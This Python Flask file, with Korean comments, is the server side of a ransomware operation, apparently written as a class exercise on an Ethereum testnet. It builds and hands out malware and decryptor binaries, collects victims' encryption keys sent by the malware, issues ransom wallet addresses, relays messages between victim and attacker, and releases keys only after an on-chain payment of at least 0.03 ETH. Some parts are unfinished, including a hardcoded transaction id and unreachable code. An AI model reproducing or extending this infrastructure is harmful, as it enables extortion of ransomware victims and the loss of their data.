from flask import Flask
from flask import request, send_file
from Database import Database
import random
import time
import os
from web3 import Web3

app = Flask(__name__)

db = Database("./db/db.json")

# 헬로 월드 보여주는 놈
@app.route('/')
def hello_world():
    return 'Hello, World!'


# Decryptor 바이너리 반환
# 언제? 관리자가 코인을 받았을 때만 다운로드 가능
@app.route("/gen_decryptor")
def gen_decryptor():
    os.system("pyinstaller -w --onefile ./decryptor_template.py")
    return send_file("./dist/decryptor_template", as_attachment=True)
    # Windows는 .exe로 반환
    # return send_file("./dist/decryptor_template.exe", as_attachment=True)

# Malware 생성 후 다운로드
@app.route("/gen_malware")
def gen_malware():
    os.system("pyinstaller -w --onefile ./malware_template.py")
    return send_file("./dist/malware_template", as_attachment=True)
    # Windows는 .exe로 반환
    # return send_file("./dist/malware_template.exe", as_attachment=True)


# malware에서 key를 서버에 저장
# 서버는 token을 랜덤하게 생성하고, DB에 저장한 뒤 token 반환
# /save_token?key={16bytes_key}
@app.route("/save_token")
def save_token():
    key = request.args.get("key")
    token = random.randint(100000000000000,999999999999999)
    etheremum_address = "0x1edfsfefwefsfesfsfae3rfewewrfed"
    db.set(key=token, value = {
        "key" : key,
        "etheremum_address" : etheremum_address,
        "created_at" : time.time(),
        "is_paid" : False,
        #채팅 메시지
        "message" : []
    })
    return {
        "token" : token,
        "etheremum_address" : "0x16D72BC0Aba6eB906fF99651A96F920Cb331aD72",
        "status" : "success"
    }


# 현재 상황을 보여주는 페이지 (악성코드 별)
# /information?token={token}
# token = /save_token에서 받은 token
@app.route("/information")
def information():
    pass

# malware 피해자가 공격자에게 메시지를 보낼 때 사용
# 단순히 DB에 저장합시다
# /send_msg?token={token}&msg={msg}
# token = /save_token에서 받은 token
# msg = 보낼 메시지
@app.route("/send_msg")
def send_msg():
    token = request.args.get("token")
    if db.exists( token  ) :    
        data = db.get( key=token )
    else :
        return "invalid token"
    
    data["message"].append( request.args.get("msg") )       
    db.set(token, data)
    
    return {
        "message" : data['message']
    }
    
# 현재 메시지 목록을 반환합니다.
# 단순히 DB에서 뽑아옵니다.
# /get_msg?token={token}
# token = /save_token에서 받은 token
@app.route("/get_msg")
def get_msg():
    token = request.args.get("token")
    if db.exists( token  ) :
        data = db.get( key=token )
    else :
        return "invalid token"
    
    return {
        "message" : data['message']
    }

# 키를 반환합니다.
# Decryptor가 키를 요청할 때 사용합니다.
@app.route("/get_key")
def get_key():
    token = request.args.get("token")
    if db.exists( token  ) :
        data :dict = db.get( token )
    else :
        return "invalid token"
    infura_url = 'https://rpc.sepolia.org'
    web3 = Web3(Web3.HTTPProvider(infura_url))

    # txid = request.args.get("txid")
    txid = "0x19c6e51b1e1c505b47aa52712109331543c6c7e4a1d4af1158d83ce7d9ddac7d"
    transaction = web3.eth.get_transaction(txid)
    if transaction is None : 
        return "invalid txid"
    if db.get("txid") :
        return " already used"
    
    # 4. 0.03 ETH 이상 보냈으면, 키 반환
    if float(Web3.from_wei(transaction['value'], "ether")) < 0.03 :
        return "invalid"
    
    return float(Web3.from_wei(transaction['value'], "ether")).__str__()
    
    if data["key"] == None :
        return "null"
    return data["key"] if data["is_paid"] == True else "you must have paid for decryption key"


# 3 일차
@app.route("/dashboard")
def dashboard() :
    balance = 0
    # 이더리음 네트워크에서 해커의 balance 를 가져오세요
    infura_url = 'https://rpc.sepolia.org'
    web3 = Web3(Web3.HTTPProvider(infura_url))# 잔액을 확인하고자 하는 계좌 주소를 설정합니다.


    account = '0x6Dbc2677e6fB596e7EBdfb256e7A4156d4816c75'# 계좌의 잔액을 조회합니다.

    balance = web3.eth.get_balance(account)# Wei 단위의 잔액을 Ether로 변환하여 출력합니다.

    return {
        "Balance" : float(web3.from_wei(balance, "ether"))
    }

if __name__ == '__main__':
    app.run(debug=True)